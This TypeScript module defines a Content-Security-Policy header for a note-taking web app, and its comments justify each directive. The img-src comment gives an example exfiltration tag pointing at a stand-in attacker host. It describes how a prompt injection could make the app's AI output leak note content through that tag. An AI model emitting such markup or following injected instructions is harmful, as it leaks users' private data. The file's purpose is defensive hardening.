// Content-Security-Policy for the SPA document.
//
// Every directive below was checked against what the app actually does rather than copied
// from a template, because a CSP that breaks a feature gets deleted the first time someone
// hits the bug, and a CSP nobody trusts is worth nothing.
//
// This module is the single source of truth, but it is NOT the only place the header is
// served. On Vercel the SPA is static: vercel.json rewrites every non-API path to
// /index.html, which the CDN serves without ever entering Express, so the deployed HTML
// document can only get its CSP from vercel.json `headers`. Express still needs its own copy
// for single-port local runs, where it serves web/dist itself. The two are duplicated by
// necessity and pinned together by a test (test/csp.test.ts) so they cannot drift silently.

/**
 * sha256 of the inline theme-bootstrap script in web/index.html.
 *
 * That script has to stay inline: it sets data-theme before first paint, and any external
 * script is a round trip during which the page renders in the wrong theme. Hashing it is what
 * lets script-src stay free of 'unsafe-inline', which is the difference between a policy that
 * stops injected script and one that only looks like it does.
 *
 * Vite copies the block into dist/index.html byte for byte, so one hash covers dev and prod.
 * It is exact: any edit to that script, including a comment or a space, changes the hash and
 * the browser will silently refuse to run it. test/csp.test.ts recomputes it from
 * web/index.html and fails if this constant no longer matches.
 */
export const THEME_SCRIPT_HASH = "'sha256-veSIuHLosKHSOljLxUIX9uojGlyW+wrMWtW/rFfYzz8='";

/**
 * Hosts the in-browser Whisper transcription needs.
 *
 * features/import/lecture/transcribeWorker.ts sets `env.allowLocalModels = false`, so every
 * model weight is fetched from huggingface.co, and onnxruntime-web pulls its .wasm binaries
 * from jsdelivr. The apex and the wildcard are both listed on purpose: CSP wildcards do not
 * match the bare domain, and HF weight downloads 302 to LFS CDN hosts (cdn-lfs.huggingface.co,
 * cdn-lfs-*.hf.co) which CSP re-checks against connect-src on the redirect.
 */
const TRANSCRIPTION_HOSTS = [
  'https://huggingface.co',
  'https://*.huggingface.co',
  'https://*.hf.co',
  'https://cdn.jsdelivr.net',
].join(' ');

const DIRECTIVES: Record<string, string> = {
  'default-src': "'self'",

  // No 'unsafe-inline'. The one inline script the app ships is allowed by hash instead, and
  // 'wasm-unsafe-eval' is required because transformers.js runs Whisper through
  // onnxruntime-web: compiling WebAssembly counts as eval to CSP. It is much narrower than
  // 'unsafe-eval', which nothing here needs.
  'script-src': `'self' 'wasm-unsafe-eval' ${THEME_SCRIPT_HASH}`,

  // 'unsafe-inline' is genuinely unavoidable for styles and is the one real concession here.
  // KaTeX writes style attributes onto the nodes it renders, TipTap injects a <style> element,
  // and the SPA uses React style={{...}} props in roughly 70 places. Style attributes cannot
  // be nonced, only hashed per value, which is not tractable for runtime-computed styles.
  // The tradeoff is a CSS-only exfiltration channel (attribute selectors with url()), and
  // img-src below is what actually closes that.
  'style-src': "'self' 'unsafe-inline'",

  // The load-bearing one. Note bodies and AI output are rendered as HTML, and neither
  // DOMPurify's default profile nor the TipTap image node restricts an <img src> to this
  // origin. Without this directive a prompt injection (see ai/prompts.ts) or a pasted note
  // could emit <img src="https://attacker/?q=..."> and leak note content through the request
  // URL with no user interaction at all. Attachments are same-origin (/uploads), verified in
  // lib/serialize.ts which emits relative paths, so restricting to 'self' costs nothing real.
  // data: is needed for the favicon and the phone-capture QR code; blob: for the local
  // object-URL previews in the import flows. Neither can address a remote host, so neither
  // reopens the channel.
  'img-src': "'self' data: blob:",

  // Fonts are self-hosted through npm (@fontsource-variable/inter, katex). data: is required
  // because Vite inlines one small woff2 into the built CSS as a base64 URI.
  'font-src': "'self' data:",

  // extractSlides.ts plays an imported video from an object URL to grab frames.
  'media-src': "'self' blob:",

  // The transcription worker is a same-origin module chunk; blob: is defensive, since
  // onnxruntime's pthread workers pick their own spawn strategy per build.
  'worker-src': "'self' blob:",

  // The SPA only ever calls relative paths (lib/api.ts fetches '/api/...' with no configurable
  // base), so 'self' covers the whole API. It also covers Vercel Analytics: on Vercel the
  // bundle resolves the script to same-origin /_vercel/insights/script.js and beacons to the
  // same prefix, which the platform proxies. va.vercel-scripts.com appears in the bundle but
  // only on the development-mode branch, which a production build never takes. If anyone sets
  // a custom scriptSrc or debug mode, that host has to be added here or analytics goes quiet.
  'connect-src': `'self' ${TRANSCRIPTION_HOSTS}`,

  // Clickjacking. The app never embeds itself and renders no iframes, so both directions lock.
  'frame-ancestors': "'none'",
  'frame-src': "'none'",

  // Stops injected markup from repointing every relative URL in the document.
  'base-uri': "'self'",

  // No <object>/<embed>/<applet>. Nothing uses them and they are a legacy bypass.
  'object-src': "'none'",

  // Forms only post back to this origin. The SPA submits through fetch, so this is free.
  'form-action': "'self'",
};

/** The policy as a header value. */
export const CSP = Object.entries(DIRECTIVES)
  .map(([directive, value]) => `${directive} ${value}`)
  .join('; ');
